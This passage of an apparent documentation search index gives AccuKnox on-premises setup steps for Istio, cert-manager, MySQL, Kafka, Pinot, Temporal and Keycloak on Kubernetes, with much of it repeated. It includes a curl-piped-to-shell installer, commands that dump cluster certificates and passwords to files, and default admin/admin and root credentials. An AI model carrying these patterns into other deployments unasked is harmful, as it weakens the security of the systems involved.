LoadBalancer IP Kindly update DNS records on cert.yaml, gateway-with-ssl.yaml, virtual-service.yaml files. Issuers, and ClusterIssuers, are Kubernetes resources that represent certificate authorities (CAs) that are able to generate signed certificates by honouring certificate signing requests. kubectl apply -f issuer.yaml # Should have Status as Ready kubectl get ClusterIssuer -n cert-manager A Certificate is a namespaced resource that references an Issuer or ClusterIssuer that determines what will be honouring the certificate request. kubectl apply -f cert.yaml kubectl get Certificate -n istio-system # Should have Status as Ready Create Gateway with SSL kubectl apply -f gateway-with-ssl.yaml Apply Virtual services A virtual service defines a set of traffic routing rules to apply when a host is addressed. Each routing rule defines matching criteria for the traffic of a specific protocol. If the traffic is matched, then it is sent to a named destination service (or subset/version of it) defined in the registry. kubectl apply -f backend-api/virtual-service.yaml kubectl apply -f keycloak/virtual-service.yaml","title":"2.1 Istio"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#22-mysql","text":"helm pull accuknox-onprem-prerequisites/mysql-chart --untar kubectl create namespace accuknox-mysql cd mysql-chart kubectl apply -f bundle.yaml -n accuknox-mysql kubectl apply -f cr.yaml -n accuknox-mysql kubectl apply -f secrets.yaml -n accuknox-mysql kubectl apply -f ssl-secrets.yaml -n accuknox-mysql kubectl get secret -n accuknox-mysql | grep mysql kubectl apply -f backup-s3.yaml -n accuknox-mysql Loading schema helm pull accuknox-onprem-prerequisites/mysql-schema-chart --untar helm upgrade --install accuknox-mysql-schema mysql-schema-chart -n accuknox-mysql Verify the installation Pods should be in Running state kubectl get pods -n accuknox-mysql Note: To configure backup with GCS, add the HMAC keys in backup-s3.yaml, change the bucket name in cr.yaml and change the cron job entries as per the requirement in the cr.yaml. HMAC Keys will vary for cloud providers. (GCP, AZURE, AWS) After following steps the above steps, you will see a similar image as above Run a sanitary test with below commands at the MySQL namespace kubectl run -i --rm --tty percona-client --image = percona:8.0 --restart = Never -n accuknox-mysql -- bash -il mysql -h accuknox-mysql-haproxy -uroot -proot_password Update the passwords in secret.yaml file and run below command kubectl apply -f secrets.yaml Optional [Backup to S3 bucket] To configure backup with gcs add the HMAC keys in backup-s3.yaml, change the bucket name in cr.yaml and cron can be changed as required cr.yaml files. FQDN: For K8\u2019s Service name accuknox-mysql-haproxy.accuknox-mysql.svc.cluster.local","title":"2.2 Mysql"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#23-kafka","text":"helm pull accuknox-onprem-prerequisites/strimzi-kafka-operator --untar helm install accuknox-kafka strimzi-kafka-operator -n accuknox-kafka Check pods should be in the running status kubectl get pods -n accuknox-kafka Get Bootstrap server endpoint kubectl get kafka accuknox -o jsonpath = '{.status.listeners[?(@.type==\"external\")].bootstrapServers}' -n accuknox-kafka Get CA certificate kubectl get secret accuknox-cluster-ca-cert -o jsonpath = '{.data.ca\\.p12}' -n accuknox-kafka | base64 -d > ca.p12 Note: For any application connecting to Kafka outside the GKE, It needs to communicate via SSL/TLS authentication. We need to provide the connectivity details to the component owners who are configuring the application deployed outside GKE Cluster. Get CA Password kubectl get secret accuknox-cluster-ca-cert -o jsonpath = '{.data.ca\\.password}' -n accuknox-kafka | base64 -d > ca.password Get User Certificate kubectl get secret/node-event-feeder-common -n accuknox-kafka -o jsonpath = '{.data.user\\.p12}' | base64 -d > user.p12 Get User Password kubectl get secret/node-event-feeder-common -n accuknox-kafka -o jsonpath = '{.data.user\\.password}' | base64 -d > user.password Convert user.p12 to base64 encoded format cat user.p12 | base64 > user.p12.base64 Convert ca.p12 to base64 encoded format cat ca.password | base64 > ca.password.base64 Convert user.password to base64 encoded format cat user.password | base64 > user.password.base64 Convert p12 to pem format openssl pkcs12 -in ca.p12 -out ca.pem Copy the password from ca.password (file) Convert ca.pem to base64 encoded format cat ca.pem | base64 > ca.pem.base64 Note: ca.p12, ca.password, user.p12 and user.password are required to be used in Java based applications. For Go based applications, use ca.pem, user.p12 and user.password. For use in Kubernetes, use the base64 versions of respective files. FQDN (K8\u2019s Service name) Value for Internal Cluster application connectivity. FQDN : accuknox-kafka-bootstrap.accuknox-kafka.svc.cluster.local:9092 Get Certificates and store it If the kafka cluster is upgraded or reinstalled, then the cluster will generate new certificates and you need to change/update key-pair in the kafka clients or applications. To mitigate this issue store these below certificates in safe place at the time of installing kafka(first time installation). Manually apply these certificates using \"kubectl\" command or place under templetes folder. And also turn off the auto certificate generation by configuring(uncomment) \"clusterca\" and \"clientsca\" to \"false\" in \"kafka-cluster.yaml\" file(below image is for your reference). Once done the changes, install/upgarde the cluster. kubectl get secret/accuknox-clients-ca -o yaml -n accuknox-kafka > accuknox-clients-ca.yaml kubectl get secret/accuknox-clients-ca-cert -o yaml -n accuknox-kafka > accuknox-clients-ca-cert.yaml kubectl get secret/accuknox-cluster-ca-cert -o yaml -n accuknox-kafka > accuknox-cluster-ca-cert.yaml kubectl get secret/accuknox-cluster-ca -o yaml -n accuknox-kafka > accuknox-cluster-ca.yaml kubectl get secret/node-event-feeder -o yaml -n accuknox-kafka > node-event-feeder.yaml kubectl get secret/node-event-feeder-common -o yaml -n accuknox-kafka > node-event-feeder-common.yaml Verify Kafka cluster kubectl get kafka -n accuknox-kafka","title":"2.3 kafka"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#24-pinot","text":"helm pull accuknox-onprem-prerequisites/pinot-chart --untar kubectl create namespace accuknox-pinot helm install accuknox-pinot pinot -n accuknox-pinot Pods should be in running status kubectl get pods -n accuknox-pinot Loading Schema and Tables To load schema, It is necessary to open the Pinot dashboard. Run the below command to do port-forward and open http://localhost:9000/ in the browser. kubectl port-forward svc/accuknox-pinot-controller -n accuknox-pinot 9000 :9000 Select Swagger REST API from the side panel Schema Creation Download the pinot-schemas.zip file and unzip it and load all the schemas using below steps: Click to Download Pinot Schemas Under schema, Select POST /schemas Add a new schema Click Try it out Paste the schema file at body object and Execute It should be 200 response codes and follow the same steps to create all schemas. Tables Creation Download the pinot-table.zip file and unzip it. Please load all the tables using the below steps. Click to Download Pinot Tables Under TABLE Select POST /tables Add a new table. Click Try it out Paste Table configuration file at body object and Execute It should be 200 response codes and follow the same steps to create all tables.","title":"2.4 Pinot"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#25-temporal","text":"Temporal operator deployment steps kubectl create ns accuknox-temporal git clone https://github.com/temporalio/helm-charts.git mv helm-charts temporal-server-chart helm dep up temporal-server-chart helm upgrade --install accuknox-temporal-server temporal-server-chart --set server.replicaCount = 1 --set cassandra.config.cluster_size = 1 --set prometheus.enabled = false --set grafana.enabled = false --set elasticsearch.enabled = false --timeout 15m -n accuknox-temporal If Prometheus/ Grafana is not required, Use the below command. helm install --set server.replicaCount = 1 --set cassandra.config.cluster_size = 1 --set prometheus.enabled = false --set grafana.enabled = false --set elasticsearch.enabled = false temporal . --timeout 15m -n accuknox-temporal kubectl get all -n temporal-server Set the namespace to Accuknox-temporal kubectl exec -n accuknox-temporal -it pod/temporaltest-admintools-<pod-id> -- /bin/bash tctl --ns accuknox-temporal n re For example, Port-forward the temporal-web (:8088) pod to view the temporal workflows UI. kubectl port-forward svc/accuknox-temporal-server-web 8088 :8088 -n accuknox-temporal","title":"2.5 Temporal"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#step-3-install-core-components","text":"Add Accuknox repository to install Core Components helm package: helm repo add accuknox-onprem-services https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-services helm repo update helm search repo accuknox-onprem-services Run the below script to install all the accuknox Core Components. Click to Download the Script All Pods should have the Running status kubectl get pods -A Install Datapipeline API Run the below command to install the data pipeline API component helm upgrade --install accuknox-datapipeline-api accuknox-onprem-services/data-pipeline-api-charts \\ --set prometheus.host = <hostname> \\ --set prometheus.user = <username> \\ --set prometheus.password = <password> \\ -n accuknox-datapipeline-api prometheus.host - specify prometheus host name prometheus.user - specify prometheus username prometheus.password - specify prometheus password Pods should be in Running status kubectl get pods -n accuknox-datapipeline-api Install shared-informer-service Install Nginx ingress controller kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.1.1/deploy/static/provider/cloud/deploy.yaml Ingress Nginx controller external IP should mapped with DNS A record like sis-api.accuknox.com kubectl get svc -n ingress-nginx Run the below command to install the shared-informer-service component For host variable need to map with DNS name helm upgrade --install accuknox-shared-informer-service accuknox-onprem-services/shared-informer-service-chart/ -n accuknox-shared-informer-service --set host = <sis-api.accuknox.com> Pods should be in Running status kubectl get pods -n accuknox-shared-informer-service kubectl get ingress -n accuknox-shared-informer-service Install Knoxautopolicy Run the below command to pull the Knoxautopolicy helm chart helm pull accuknox-onprem-services/knox-auto-policy-chart --untar Copy the password from user.password file Copy the ca.pem.base64 and user.p12.base64 file & paste in to templates/secrets.yaml file in Knoxautopolicy-chart. cluster-management-url value will be istio gateway host eg. https://api-onprem.accuknox.com For user_password variable need to map with kafka user.password file content helm install knox-auto-policy-chart \\ accuknox-onprem-services/knox-auto-policy-chart \\ --set config.application.cluster.cluster-mgmt-url = <cluster-management-url> \\ --set config.feed-consumer.kafka.keystore.pword = <user_password> \\ -n accuknox-knoxautopolicy Pods should be in Running status kubectl get pods -n accuknox-knoxautopolicy Configure Keycloak Click to Download the Accuknox UI config file Open Keycloak using the URL configured eg. keycloak.example.com Click on administration console default username \u2192 admin | default password \u2192 admin Click master add the realm Click on the Realm settings \u2192 General section Click on the login section Click on the tokens section and please configure same as below images Click Clients \u2192 click create to import the files and upload the below accuknox-ui-zip folder files. Click on accukox-ui Click on a credential Get the client secret and client id for install user-management Click on the service account roles Click on client roles \u2192 select account \u2192 select all the available roles \u2192 click add selected. Click on the broker and select the available roles and click on add selected Click on realm-management and select all the available roles and add","title":"Step 3: Install Core Components"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#step-4-install-accuknox-ui","text":"It is mandatory to have Istio API Gateway Endpoint before deploying Accuknox UI. Attach the API gateway in Accuknox UI. Ingress Nginx controller external IP should mapped with DNS A record like app-onprem.accuknox.com kubectl get svc -n ingress-nginx UI Installation using helm helm upgrade --install accuknox-ui accuknox-onprem-services/accuknox-ui --set ingress.hostaname = <ui-hostname> ClusterIssuer should be in Ready state kubectl get ClusterIssuer Everything should be in Running status kubectl get pod kubectl get ingress Install user management For client_id and client_secret has to be taken from keycloak configuration helm upgrade --install accuknox-user-mgmt-service accuknox-onprem-services/user-management-service-chart --set config.ui.host = <app.accuknox.com> --set config.client_secret = <client_secret> --set config.client_id = <client_id> -n accuknox-user-mgmt Pods should be in Running status kubectl get pods -n accuknox-user-mgmt","title":"Step 4: Install Accuknox UI"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#login-screen","text":"","title":"Login Screen"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#step-5-onboarding-steps","text":"Onboard your K8\u2019s Cluster into AccuKnox Control Plane","title":"Step 5: Onboarding Steps"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#to-know-more","text":"Setup Monitoring for On-prem Setup Loki Logging Tool for On-prem Setup ELK Logging Tool for On-prem Ship logs directly to Accuknox ELK Ship logs directly to Accuknox Splunk","title":"To know more"},{"location":"accuknox-onprem/onprem-setup-steps/create-cluster/","text":"Create a cluster with the below hardware resources \u00b6 Components Name MySQL Kafka Pinot Core Components Node pool name mySql kafka pinot microservices No. of nodes 3 3 3 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) E2 / ec2 / vm (vmware / Cloud based VM) E2 / ec2 / vm (vmware / Cloud based VM) E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) Any Linux based OS with Container support ( EG: GCP COS-Containerd) Any Linux based OS with Container support ( EG: GCP COS-Containerd) Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU per nodes 16 6 12 18 Memory per nodes 20 16 40 40 Disk size per nodes 50 50 50 50 Total CPU 48 18 36 54 Total Memory 60 48 120 120 Total Disk Size 150 150 150 150 Taints and Labels mysql:true kafka:true pinot:true NA","title":"Create a cluster with the below hardware resources"},{"location":"accuknox-onprem/onprem-setup-steps/create-cluster/#create-a-cluster-with-the-below-hardware-resources","text":"Components Name MySQL Kafka Pinot Core Components Node pool name mySql kafka pinot microservices No. of nodes 3 3 3 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) E2 / ec2 / vm (vmware / Cloud based VM) E2 / ec2 / vm (vmware / Cloud based VM) E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) Any Linux based OS with Container support ( EG: GCP COS-Containerd) Any Linux based OS with Container support ( EG: GCP COS-Containerd) Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU per nodes 16 6 12 18 Memory per nodes 20 16 40 40 Disk size per nodes 50 50 50 50 Total CPU 48 18 36 54 Total Memory 60 48 120 120 Total Disk Size 150 150 150 150 Taints and Labels mysql:true kafka:true pinot:true NA","title":"Create a cluster with the below hardware resources"},{"location":"accuknox-onprem/onprem-setup-steps/install-accuknox-ui/","text":"Ingress Nginx controller external IP should mapped with DNS A record like app-onprem.accuknox.com kubectl get svc -n ingress-nginx UI Installation using helm helm upgrade --install accuknox-ui accuknox-onprem-services/accuknox-ui --set ingress.hostaname = <ui-hostname> ClusterIssuer should be in Ready state kubectl get ClusterIssuer Everything should be in Running status kubectl get pod kubectl get ingress Install user management \u00b6 For client_id and client_secret has to be taken from keycloak configuration helm upgrade --install accuknox-user-mgmt-service accuknox-onprem-services/user-management-service-chart --set config.ui.host = <app.accuknox.com> --set config.client_secret = <client_secret> --set config.client_id = <client_id> -n accuknox-user-mgmt + Pods should be in Running status kubectl get pods -n accuknox-user-mgmt Login Screen \u00b6","title":"Install accuknox ui"},{"location":"accuknox-onprem/onprem-setup-steps/install-accuknox-ui/#install-user-management","text":"For client_id and client_secret has to be taken from keycloak configuration helm upgrade --install accuknox-user-mgmt-service accuknox-onprem-services/user-management-service-chart --set config.ui.host = <app.accuknox.com> --set config.client_secret = <client_secret> --set config.client_id = <client_id> -n accuknox-user-mgmt + Pods should be in Running status kubectl get pods -n accuknox-user-mgmt","title":"Install user management"},{"location":"accuknox-onprem/onprem-setup-steps/install-accuknox-ui/#login-screen","text":"","title":"Login Screen"},{"location":"accuknox-onprem/onprem-setup-steps/install-core-components/","text":"Add Accuknox repository to install Core Components helm package: helm repo add accuknox-onprem-services https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-services helm repo update helm search repo accuknox-onprem-services Please run the below script to install all the accuknox Core Components. Click to Download the Script All Pods should have the Running status kubectl get pods -A Install Datapipeline API \u00b6 Run the below command to install the data pipeline API component helm upgrade --install accuknox-datapipeline-api accuknox-onprem-services/data-pipeline-api-charts \\ --set prometheus.host = <hostname> \\ --set prometheus.user = <username> \\ --set prometheus.password = <password> \\ -n accuknox-datapipeline-api prometheus.host - specify prometheus host name prometheus.user - specify prometheus username prometheus.password - specify prometheus password Pods should be in Running status kubectl get pods -n accuknox-datapipeline-api Install shared-informer-service \u00b6 Install Nginx ingress controller kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.1.1/deploy/static/provider/cloud/deploy.yaml Ingress Nginx controller external IP should mapped with DNS A record like sis-api.accuknox.com kubectl get svc -n ingress-nginx Run the below command to install the shared-informer-service component For host variable need to map with DNS name helm upgrade --install accuknox-shared-informer-service accuknox-onprem-services/shared-informer-service-chart/ -n accuknox-shared-informer-service --set host = <sis-api.accuknox.com> + Pods should be in Running status kubectl get pods -n accuknox-shared-informer-service kubectl get ingress -n accuknox-shared-informer-service Install Knoxautopolicy \u00b6 Run the below command to pull the Knoxautopolicy helm chart helm pull accuknox-onprem-services/knox-auto-policy-chart --untar Copy the password from user.password file Copy the ca.pem.base64 and user.p12.base64 file & paste in to templates/secrets.yaml file in Knoxautopolicy-chart. cluster-management-url value will be istio gateway host eg. https://api-onprem.accuknox.com For user_password variable need to map with kafka user.password file content helm install knox-auto-policy-chart \\ accuknox-onprem-services/knox-auto-policy-chart \\ --set config.application.cluster.cluster-mgmt-url = <cluster-management-url> \\ --set config.feed-consumer.kafka.keystore.pword = <user_password> \\ -n accuknox-knoxautopolicy Pods should be in Running status kubectl get pods -n accuknox-knoxautopolicy Configure Keycloak \u00b6 Click to Download the Accuknox UI config file Open Keycloak using the URL configured eg. keycloak.example.com Click on administration console default username \u2192 admin | default password \u2192 admin Click master add the realm Click on the Realm settings \u2192 General section Click on the login section Click on the tokens section and please configure same as below images Click Clients \u2192 click create to import the files and upload the below accuknox-ui-zip folder files. Click on accukox-ui Click on a credential Note: Kindly copy and paste the client secret and client id for install user-management Click on the service account roles Click on client roles \u2192 select account \u2192 select all the available roles \u2192 click add selected. Click on the broker and select the available roles and click on add selected Click on realm-management and select all the available roles and add","title":"Install core components"},{"location":"accuknox-onprem/onprem-setup-steps/install-core-components/#install-datapipeline-api","text":"Run the below command to install the data pipeline API component helm upgrade --install accuknox-datapipeline-api accuknox-onprem-services/data-pipeline-api-charts \\ --set prometheus.host = <hostname> \\ --set prometheus.user = <username> \\ --set prometheus.password = <password> \\ -n accuknox-datapipeline-api prometheus.host - specify prometheus host name prometheus.user - specify prometheus username prometheus.password - specify prometheus password Pods should be in Running status kubectl get pods -n accuknox-datapipeline-api","title":"Install Datapipeline API"},{"location":"accuknox-onprem/onprem-setup-steps/install-core-components/#install-shared-informer-service","text":"Install Nginx ingress controller kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.1.1/deploy/static/provider/cloud/deploy.yaml Ingress Nginx controller external IP should mapped with DNS A record like sis-api.accuknox.com kubectl get svc -n ingress-nginx Run the below command to install the shared-informer-service component For host variable need to map with DNS name helm upgrade --install accuknox-shared-informer-service accuknox-onprem-services/shared-informer-service-chart/ -n accuknox-shared-informer-service --set host = <sis-api.accuknox.com> + Pods should be in Running status kubectl get pods -n accuknox-shared-informer-service kubectl get ingress -n accuknox-shared-informer-service","title":"Install shared-informer-service"},{"location":"accuknox-onprem/onprem-setup-steps/install-core-components/#install-knoxautopolicy","text":"Run the below command to pull the Knoxautopolicy helm chart helm pull accuknox-onprem-services/knox-auto-policy-chart --untar Copy the password from user.password file Copy the ca.pem.base64 and user.p12.base64 file & paste in to templates/secrets.yaml file in Knoxautopolicy-chart. cluster-management-url value will be istio gateway host eg. https://api-onprem.accuknox.com For user_password variable need to map with kafka user.password file content helm install knox-auto-policy-chart \\ accuknox-onprem-services/knox-auto-policy-chart \\ --set config.application.cluster.cluster-mgmt-url = <cluster-management-url> \\ --set config.feed-consumer.kafka.keystore.pword = <user_password> \\ -n accuknox-knoxautopolicy Pods should be in Running status kubectl get pods -n accuknox-knoxautopolicy","title":"Install Knoxautopolicy"},{"location":"accuknox-onprem/onprem-setup-steps/install-core-components/#configure-keycloak","text":"Click to Download the Accuknox UI config file Open Keycloak using the URL configured eg. keycloak.example.com Click on administration console default username \u2192 admin | default password \u2192 admin Click master add the realm Click on the Realm settings \u2192 General section Click on the login section Click on the tokens section and please configure same as below images Click Clients \u2192 click create to import the files and upload the below accuknox-ui-zip folder files. Click on accukox-ui Click on a credential Note: Kindly copy and paste the client secret and client id for install user-management Click on the service account roles Click on client roles \u2192 select account \u2192 select all the available roles \u2192 click add selected. Click on the broker and select the available roles and click on add selected Click on realm-management and select all the available roles and add","title":"Configure Keycloak"},{"location":"accuknox-onprem/onprem-setup-steps/istio/","text":"Please wait for the cluster to be up and running (Ready State) and connect to the cluster and start installing prerequisites. Installing Istio \u00b6 Go to the Istio release page to download the installation file for your OS, or download and extract the latest release automatically (Linux or macOS) curl -L https://istio.io/downloadIstio | ISTIO_VERSION = 1 .10.0 TARGET_ARCH = x86_64 sh - Move to the Istio package directory. For example, if the package is istio-1.11.3 cd istio-1.10.0 Create a namespace istio-system for Istio components kubectl create namespace istio-system Install the Istio base chart which contains cluster-wide resources used by the Istio control plane helm install istio-base manifests/charts/base -n istio-system Install the Istio discovery chart which deploys the istiod control plane service helm install istiod manifests/charts/istio-control/istio-discovery -n istio-system Install the Istio ingress gateway chart which contains the ingress gateway components helm install istio-ingress manifests/charts/gateways/istio-ingress -n istio-system Verifying the Installation \u00b6 Ensure all Kubernetes pods in istio-system namespace are deployed and have a STATUS of Running kubectl get pods -n istio-system Install Cert Manager \u00b6 Install cert-manager. Cert-manager will manage the certificates of gateway domains. When running on GKE (Google Kubernetes Engine), you might encounter a \u2018permission denied\u2019 error when creating some of the required resources. kubectl create clusterrolebinding cluster-admin-binding --clusterrole = cluster-admin --user = $( gcloud config get-value core/account ) Install Cert Manager \u00b6 kubectl apply -f https://github.com/jetstack/cert-manager/releases/download/v1.3.1/cert-manager.yaml All pods should have in Running state kubectl get pods -n cert-manager Installing Gateway \u00b6 Add Accuknox Repositories to install helm packages helm repo add accuknox-onprem-prerequisites https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-prerequisites helm repo update helm search repo accuknox-onprem-prerequisites helm pull accuknox-onprem-prerequisites/istio-gateway-charts --untar + Move to directory cd istio-gateway-charts Istio Gateway configurations for DNS This gateway config file defines the base API endpoints of the microservices under DNS This repository also contains necessary files to setup SSL for DNS (Refer issuer.yaml and cert.yaml) using cert-manager Find the Gateway IP \u00b6 INGRESS_HOST = $( kubectl -n istio-system get service istio-ingressgateway -o jsonpath = '{.status.loadBalancer.ingress[0].ip}' ) echo ${ INGRESS_HOST } Create DNS using IP \u00b6 Create A record for example (api-onprem.accuknox.com and keycloak.example.com) using LoadBalancer IP Kindly update DNS records on cert.yaml, gateway-with-ssl.yaml, virtual-service.yaml files. Issuers, and ClusterIssuers, are Kubernetes resources that represent certificate authorities (CAs) that are able to generate signed certificates by honouring certificate signing requests. kubectl apply -f issuer.yaml # Should have Status as Ready kubectl get ClusterIssuer -n cert-manager + A Certificate is a namespaced resource that references an Issuer or ClusterIssuer that determines what will be honouring the certificate request. kubectl apply -f cert.yaml kubectl get Certificate -n istio-system # Should have Status as Ready + Create Gateway with SSL kubectl apply -f gateway-with-ssl.yaml Apply Virtual services \u00b6 A virtual service defines a set of traffic routing rules to apply when a host is addressed. Each routing rule defines matching criteria for the traffic of a specific protocol. If the traffic is matched, then it is sent to a named destination service (or subset/version of it) defined in the registry. kubectl apply -f backend-api/virtual-service.yaml kubectl apply -f keycloak/virtual-service.yaml","title":"Istio"},{"location":"accuknox-onprem/onprem-setup-steps/istio/#installing-istio","text":"Go to the Istio release page to download the installation file for your OS, or download and extract the latest release automatically (Linux or macOS) curl -L https://istio.io/downloadIstio | ISTIO_VERSION = 1 .10.0 TARGET_ARCH = x86_64 sh - Move to the Istio package directory. For example, if the package is istio-1.11.3 cd istio-1.10.0 Create a namespace istio-system for Istio components kubectl create namespace istio-system Install the Istio base chart which contains cluster-wide resources used by the Istio control plane helm install istio-base manifests/charts/base -n istio-system Install the Istio discovery chart which deploys the istiod control plane service helm install istiod manifests/charts/istio-control/istio-discovery -n istio-system Install the Istio ingress gateway chart which contains the ingress gateway components helm install istio-ingress manifests/charts/gateways/istio-ingress -n istio-system","title":"Installing Istio"},{"location":"accuknox-onprem/onprem-setup-steps/istio/#verifying-the-installation","text":"Ensure all Kubernetes pods in istio-system namespace are deployed and have a STATUS of Running kubectl get pods -n istio-system","title":"Verifying the Installation"},{"location":"accuknox-onprem/onprem-setup-steps/istio/#install-cert-manager","text":"Install cert-manager. Cert-manager will manage the certificates of gateway domains. When running on GKE (Google Kubernetes Engine), you might encounter a \u2018permission denied\u2019 error when creating some of the required resources. kubectl create clusterrolebinding cluster-admin-binding --clusterrole = cluster-admin --user = $( gcloud config get-value core/account )","title":"Install Cert Manager"},{"location":"accuknox-onprem/onprem-setup-steps/istio/#install-cert-manager_1","text":"kubectl apply -f https://github.com/jetstack/cert-manager/releases/download/v1.3.1/cert-manager.yaml All pods should have in Running state kubectl get pods -n cert-manager","title":"Install Cert Manager"},{"location":"accuknox-onprem/onprem-setup-steps/istio/#installing-gateway","text":"Add Accuknox Repositories to install helm packages helm repo add accuknox-onprem-prerequisites https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-prerequisites helm repo update helm search repo accuknox-onprem-prerequisites helm pull accuknox-onprem-prerequisites/istio-gateway-charts --untar + Move to directory cd istio-gateway-charts Istio Gateway configurations for DNS This gateway config file defines the base API endpoints of the microservices under DNS This repository also contains necessary files to setup SSL for DNS (Refer issuer.yaml and cert.yaml) using cert-manager","title":"Installing Gateway"},{"location":"accuknox-onprem/onprem-setup-steps/istio/#find-the-gateway-ip","text":"INGRESS_HOST = $( kubectl -n istio-system get service istio-ingressgateway -o jsonpath = '{.status.loadBalancer.ingress[0].ip}' ) echo ${ INGRESS_HOST }","title":"Find the Gateway IP"},{"location":"accuknox-onprem/onprem-setup-steps/istio/#create-dns-using-ip","text":"Create A record for example (api-onprem.accuknox.com and keycloak.example.com) using LoadBalancer IP Kindly update DNS records on cert.yaml, gateway-with-ssl.yaml, virtual-service.yaml files. Issuers, and ClusterIssuers, are Kubernetes resources that represent certificate authorities (CAs) that are able to generate signed certificates by honouring certificate signing requests. kubectl apply -f issuer.yaml # Should have Status as Ready kubectl get ClusterIssuer -n cert-manager + A Certificate is a namespaced resource that references an Issuer or ClusterIssuer that determines what will be honouring the certificate request. kubectl apply -f cert.yaml kubectl get Certificate -n istio-system # Should have Status as Ready + Create Gateway with SSL kubectl apply -f gateway-with-ssl.yaml","title":"Create DNS using IP"},{"location":"accuknox-onprem/onprem-setup-steps/istio/#apply-virtual-services","text":"A virtual service defines a set of traffic routing rules to apply when a host is addressed. Each routing rule defines matching criteria for the traffic of a specific protocol. If the traffic is matched, then it is sent to a named destination service (or subset/version of it) defined in the registry. kubectl apply -f backend-api/virtual-service.yaml kubectl apply -f keycloak/virtual-service.yaml","title":"Apply Virtual services"},{"location":"accuknox-onprem/onprem-setup-steps/kafka/","text":"helm pull accuknox-onprem-prerequisites/strimzi-kafka-operator --untar helm install accuknox-kafka strimzi-kafka-operator -n accuknox-kafka Check the Pods, Pods should have the running status kubectl get pods -n accuknox-kafka Get Bootstrap server endpoint kubectl get kafka accuknox -o jsonpath = '{.status.listeners[?(@.type==\"external\")].bootstrapServers}' -n accuknox-kafka Get CA certificate kubectl get secret accuknox-cluster-ca-cert -o jsonpath = '{.data.ca\\.p12}' -n accuknox-kafka | base64 -d > ca.p12 Notes \u00b6 For any application connecting to Kafka outside the GKE, It needs to communicate via SSL/TLS authentication. We need to provide the connectivity details to the component owners who are configuring the application deployed outside GKE Cluster. Get CA Password kubectl get secret accuknox-cluster-ca-cert -o jsonpath = '{.data.ca\\.password}' -n accuknox-kafka | base64 -d > ca.password + Get User Certificate kubectl get secret/node-event-feeder-common -n accuknox-kafka -o jsonpath = '{.data.user\\.p12}' | base64 -d > user.p12 + Get User Password kubectl get secret/node-event-feeder-common -n accuknox-kafka -o jsonpath = '{.data.user\\.password}' | base64 -d > user.password Convert user.p12 to base64 encoded format cat user.p12 | base64 > user.p12.base64 Convert ca.p12 to base64 encoded format cat ca.password | base64 > ca.password.base64 Convert user.password to base64 encoded format cat user.password | base64 > user.password.base64 Convert p12 to pem format openssl pkcs12 -in ca.p12 -out ca.pem Note: Copy the password from ca.password (file) Convert ca.pem to base64 encoded format cat ca.pem | base64 > ca.pem.base64 Note \u00b6 ca.p12, ca.password, user.p12 and user.password are required to be used in Java based applications. For Go based applications, use ca.pem, user.p12 and user.password. For use in Kubernetes, use the base64 versions of respective files. FQDN (K8\u2019s Service name) Value for Internal Cluster application connectivity. FQDN : accuknox-kafka-bootstrap.accuknox-kafka.svc.cluster.local:9092 Get Certificates and store it \u00b6 If the kafka cluster is upgraded or reinstalled, then the cluster will generate new certificates and you need to change/update key-pair in the kafka clients or applications. To mitigate this issue store these below certificates in safe place at the time of installing kafka(first time installation). Manually apply these certificates using \"kubectl\" command or place under templetes folder. And also turn off the auto certificate generation by configuring(uncomment) \"clusterca\" and \"clientsca\" to \"false\" in \"kafka-cluster.yaml\" file(below image is for your reference). Once done the changes, install/upgarde the cluster. kubectl get secret/accuknox-clients-ca -o yaml -n accuknox-kafka > accuknox-clients-ca.yaml kubectl get secret/accuknox-clients-ca-cert -o yaml -n accuknox-kafka > accuknox-clients-ca-cert.yaml kubectl get secret/accuknox-cluster-ca-cert -o yaml -n accuknox-kafka > accuknox-cluster-ca-cert.yaml kubectl get secret/accuknox-cluster-ca -o yaml -n accuknox-kafka > accuknox-cluster-ca.yaml kubectl get secret/node-event-feeder -o yaml -n accuknox-kafka > node-event-feeder.yaml kubectl get secret/node-event-feeder-common -o yaml -n accuknox-kafka > node-event-feeder-common.yaml Verify Kafka cluster is ready or not \u00b6 kubectl get kafka -n accuknox-kafka Everything should be in Running and Ready state \u00b6 kubectl get all -n accuknox-kafka","title":"Kafka"},{"location":"accuknox-onprem/onprem-setup-steps/kafka/#notes","text":"For any application connecting to Kafka outside the GKE, It needs to communicate via SSL/TLS authentication. We need to provide the connectivity details to the component owners who are configuring the application deployed outside GKE Cluster. Get CA Password kubectl get secret accuknox-cluster-ca-cert -o jsonpath = '{.data.ca\\.password}' -n accuknox-kafka | base64 -d > ca.password + Get User Certificate kubectl get secret/node-event-feeder-common -n accuknox-kafka -o jsonpath = '{.data.user\\.p12}' | base64 -d > user.p12 + Get User Password kubectl get secret/node-event-feeder-common -n accuknox-kafka -o jsonpath = '{.data.user\\.password}' | base64 -d > user.password Convert user.p12 to base64 encoded format cat user.p12 | base64 > user.p12.base64 Convert ca.p12 to base64 encoded format cat ca.password | base64 > ca.password.base64 Convert user.password to base64 encoded format cat user.password | base64 > user.password.base64 Convert p12 to pem format openssl pkcs12 -in ca.p12 -out ca.pem Note: Copy the password from ca.password (file) Convert ca.pem 